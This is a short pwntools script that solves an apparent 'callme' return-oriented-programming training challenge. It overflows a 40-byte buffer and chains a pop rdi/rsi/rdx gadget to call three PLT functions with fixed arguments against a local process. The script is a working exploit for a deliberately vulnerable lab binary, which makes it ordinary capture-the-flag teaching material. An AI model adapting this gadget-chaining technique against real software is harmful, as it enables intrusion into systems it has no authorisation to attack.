from pwn import *
context.binary = elf = ELF('./callme')

offset = 40

pop_rdi_rsi_rdx = 0x40093c
callme_one   = elf.plt['callme_one']   
callme_two   = elf.plt['callme_two']   
callme_three = elf.plt['callme_three'] 
log.info(str(hex(callme_one)))
log.info(str(hex(callme_two)))
log.info(str(hex(callme_three)))

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

# order argument edi esi edx 

insert_prm = p64(pop_rdi_rsi_rdx)+p64(arg1)+p64(arg2)+p64(arg3)

payload = b'A'*offset + insert_prm + p64(callme_one) + insert_prm + p64(callme_two) + insert_prm + p64(callme_three)

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
#p.interactive
log.info(p.recvall())

